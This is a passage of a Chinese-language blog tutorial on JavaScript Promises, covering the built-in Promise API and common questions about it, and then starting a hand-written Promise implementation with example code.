title="API"></a>API</h3><ul><li><ol><li>Promise 构造函数: Promise (excutor) {}</li></ol><ul><li>(1) executor 函数: 执行器 (resolve, reject) =&gt; {}/匿名函数，executor 函数中有两个形参resolve, reject</li><li>(2) resolve 函数: 内部定义成功时调用的函数 value =&gt; {}</li><li>(3) reject 函数: 内部定义失败时调用的函数 reason =&gt; {}<br><code>说明: executor 会在 Promise 内部立即同步调用,异步操作在执行器中执行</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 同步调用，不会进入队列，会立即执行</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>)</span><br><span class="line"><span class="comment">/*执行结果*/</span></span><br><span class="line"><span class="number">222</span></span><br><span class="line"><span class="number">111</span></span><br></pre></td></tr></table></figure><ul><li><ol start="2"><li>Promise.prototype.then 方法: (onResolved, onRejected) =&gt; {}</li></ol><ul><li>(1) onResolved 函数: 成功的回调函数 (value) =&gt; {}</li><li>(2) onRejected 函数: 失败的回调函数 (reason) =&gt; {}<br><code>说明: 指定用于得到成功 value 的成功回调和用于得到失败 reason 的失败回调,返回一个新的 promise 对象</code></li></ul></li><li><ol start="3"><li>Promise.prototype.catch 方法: (onRejected) =&gt; {}</li></ol><ul><li>(1) onRejected 函数: 失败的回调函数 (reason) =&gt; {}<br><code>说明: then()的语法糖, 相当于: then(undefined, onRejected)</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行catch方法</span></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><ol start="4"><li>Promise.resolve 方法: (value) =&gt; {}</li></ol><ul><li>(1) value: 成功的数据或 promise 对象<br><code>说明: 返回一个成功/失败的 promise 对象</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// resolve方法属于Promise函数对象的，不属于实例对象</span></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">521</span>); <span class="comment">// promiseState:fulfilled , promiseResult: 521</span></span><br><span class="line"><span class="comment">// 如果传入的参数为 非Promise类型的对象, 则返回的结果为成功promise对象</span></span><br><span class="line"><span class="comment">// 如果传入的参数为 Promise 对象, 则参数的结果决定了 resolve 的结果</span></span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// resolve(&#x27;OK&#x27;);</span></span><br><span class="line">  <span class="title function_">reject</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2); <span class="comment">// Promise对象 promiseState:rejected , promiseResult: Error</span></span><br><span class="line">p2.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(reason); <span class="comment">// Error</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><ol start="5"><li>Promise.reject 方法: (reason) =&gt; {}</li></ol><ul><li>(1) reason: 失败的原因<br><code>说明: 返回一个失败的 promise 对象</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="number">521</span>); <span class="comment">// promiseState:rejected , promiseResult: 521</span></span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;iloveyou&#x27;</span>); <span class="comment">// promiseState:rejected , promiseResult: iloveyou</span></span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p3); <span class="comment">// promiseState:rejected , promiseResult: promise对象</span></span><br><span class="line">p3.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(reason); <span class="comment">// promise对象</span></span><br><span class="line">  reason.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// OK</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><ol start="6"><li>Promise.all 方法: (promises) =&gt; {}</li></ol><ul><li>(1) promises: 包含 n 个 promise 的数组<ul><li>成功结果：每一个promise对象成功结果组成的数组</li><li>失败结果：在数组中第一个失败的promise对象失败的结果<br><code>说明: 返回一个新的 promise, 只有所有的 promise 都成功才成功, 只要有一个失败了就直接失败</code></li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;Error1&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p4 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Oh Yeah&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p5 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Error2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p3, p4]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// promise对象，promiseState:fulfilled , promiseResult: [&#x27;OK&#x27;,&#x27;Success&#x27;,&#x27;Oh Yeah&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result1 = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p2, p5]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1) <span class="comment">// promise对象，promiseState:rejected , promiseResult: Error1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result2 = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p5, p2]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result2) <span class="comment">// promise对象，promiseState:rejected , promiseResult: Error1</span></span><br></pre></td></tr></table></figure><ul><li><ol start="7"><li>Promise.race 方法: (promises) =&gt; {}</li></ol><ul><li>(1) promises: 包含 n 个 promise 的数组<br><code>说明: 返回一个新的 promise, 第一个完成的 promise 的结果状态就是最终的结果状态</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 异步任务</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p4 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Oh Yeah&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Promise</span>.<span class="title function_">race</span>([p1, p3, p4]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// promise对象，promiseState:fulfilled , promiseResult: OK</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result1 = <span class="title class_">Promise</span>.<span class="title function_">race</span>([p2, p3, p4]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1); <span class="comment">// promise对象，promiseState:fulfilled , promiseResult: Success</span></span><br></pre></td></tr></table></figure><h3 id="promise-的几个关键问题"><a href="#promise-的几个关键问题" class="headerlink" title="promise 的几个关键问题"></a>promise 的几个关键问题</h3><ul><li><ol><li>如何改变 promise 的状态?</li></ol><ul><li>(1) <code>resolve(value)</code>: 如果当前是 pending 就会变为 resolved</li><li>(2) <code>reject(reason)</code>: 如果当前是 pending 就会变为 rejected</li><li>(3) <code>抛出异常</code>: 如果当前是 pending 就会变为 rejected</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1. resolve 函数</span></span><br><span class="line">  <span class="comment">// resolve(&#x27;ok&#x27;); // pending   =&gt; fulfilled (resolved)</span></span><br><span class="line">  <span class="comment">//2. reject 函数</span></span><br><span class="line">  <span class="comment">// reject(&quot;error&quot;); // pending  =&gt;  rejected </span></span><br><span class="line">  <span class="comment">//3. 抛出错误</span></span><br><span class="line">  <span class="comment">// throw &#x27;出问题了&#x27;; // pending  =&gt;  rejected </span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><ol start="2"><li>一个 promise 指定<code>多个成功/失败</code>回调函数, 都会调用吗? </li></ol><ul><li>当 promise <code>改变为对应状态</code>时都会<code>调用</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定回调 - 1</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定回调 - 2</span></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行结果</span></span><br><span class="line"><span class="variable constant_">OK</span></span><br><span class="line"><span class="number">222</span></span><br></pre></td></tr></table></figure><ul><li><ol start="3"><li>改变 promise 状态和指定回调函数谁先谁后?</li></ol><ul><li>(1) 都有可能, 正常情况下是先指定回调再改变状态, 但也可以先改状态再指定回调</li><li>(2) 如何先改状态再指定回调? <ul><li>① 在执行器中直接调用 resolve()/reject()</li><li>② 延迟更长时间才调用 then()</li></ul></li><li>(3) 什么时候才能得到数据? <ul><li>① 如果先指定的回调, 那当状态发生改变时, 回调函数就会调用, 得到数据</li><li>② 如果先改变的状态, 那当指定回调时, 回调函数就会调用, 得到数据</li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">/*执行器函数当中的任务是同步任务，先改变promise对象状态，然后再指定回调*/</span></span><br><span class="line">  <span class="comment">// resolve(&#x27;OK&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*执行器函数当中的任务是异步任务，先指定回调，然后再改变promise对象状态*/</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;,<span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><ol start="4"><li>promise.then()返回的新 promise 的结果状态由什么决定?</li></ol><ul><li>(1) 简单表达: 由 then()指定的回调函数执行的结果决定</li><li>(2) 详细表达: <ul><li>① 如果抛出异常, 新 promise 变为 rejected, reason 为抛出的异常</li><li>② 如果返回的是非 promise 的任意值, 新 promise 变为 resolved, value 为返回的值</li><li>③ 如果返回的是另一个新 promise, 此 promise 的结果就会成为新 promise 的结果</li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//执行 then 方法</span></span><br><span class="line"><span class="keyword">let</span> result = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1. 抛出错误</span></span><br><span class="line">  <span class="comment">// throw &#x27;出了问题&#x27;; // promise对象，promiseState:rejected , promiseResult: 出了问题</span></span><br><span class="line">  <span class="comment">//2. 返回结果是非 Promise 类型的对象</span></span><br><span class="line">  <span class="comment">// return 521; // promise对象，promiseState:fulfilled , promiseResult: 521</span></span><br><span class="line">  <span class="comment">//3. 返回结果是 Promise 对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// resolve(&#x27;success&#x27;); // promise对象，promiseState:fulfilled , promiseResult: success</span></span><br><span class="line">      <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>); <span class="comment">// promise对象，promiseState:rejected , promiseResult: error</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><ul><li><ol start="5"><li>promise 如何串连多个操作任务?</li></ol><ul><li>(1) promise 的 then()返回一个新的 promise, 可以形成 then()的链式调用</li><li>(2) 通过 then 的链式调用串连多个同步/异步任务</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 不是立刻输出，至少等1s,等p的状态改变，p的回调函数才能执行</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// success</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// then的返回结果是promise对象，promise状态由它指定的回调函数的返回值决定，第二个then回调函数没有返回值</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// undefined</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><ol start="6"><li>promise 异常传透?</li></ol><ul><li>(1) 当使用 promise 的 then 链式调用时, 可以在最后指定失败的回调,</li><li>(2) 前面任何操作出了异常, 都会传到最后失败的回调中处理</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">    <span class="comment">// reject(&#x27;Err&#x27;);</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// console.log(111);</span></span><br><span class="line">  <span class="keyword">throw</span> <span class="string">&#x27;失败啦!&#x27;</span>;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><ol start="7"><li>中断 promise 链?</li></ol><ul><li>(1) 当使用 promise 的 then 链式调用时, 在中间中断, 不再调用后面的回调函数</li><li>(2) 办法: 在回调函数中返回一个 pending 状态的 promise 对象，因为状态没有改变</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span><br><span class="line">  <span class="comment">//有且只有一个方式</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果</span></span><br><span class="line"><span class="number">111</span></span><br></pre></td></tr></table></figure><hr><h1 id="Promise-自定义封装"><a href="#Promise-自定义封装" class="headerlink" title="Promise 自定义封装"></a>Promise 自定义封装</h1><h2 id="初始化结构搭建"><a href="#初始化结构搭建" class="headerlink" title="初始化结构搭建"></a>初始化结构搭建</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Promise 构造函数</span></span><br><span class="line"><span class="comment">excutor: 内部同步执行的函数 (resolve, reject) =&gt; &#123;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">为 promise 指定成功/失败的回调函数</span></span><br><span class="line"><span class="comment">函数的返回值是一个新的 promise 对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//添加 then 方法，在Promise构造函数的显式原型对象上设置then方法，then方法声明时，有两个形参</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 1 - 初始结构搭建<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// resolve,reject --&gt; 形参</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// p实例对象的隐式原型上有then方法，then方法有两个实参</span></span></span><br><span class="line"><span class="language-javascript">        p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="resolve与reject结构搭建"><a href="#resolve与reject结构搭建" class="headerlink" title="resolve与reject结构搭建"></a>resolve与reject结构搭建</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">// resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步调用『执行器函数』</span></span><br><span class="line">    <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="resolve与reject函数实现"><a href="#resolve与reject函数实现" class="headerlink" title="resolve与reject函数实现"></a>resolve与reject函数实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值，否则修改的时window的属性值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">    <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 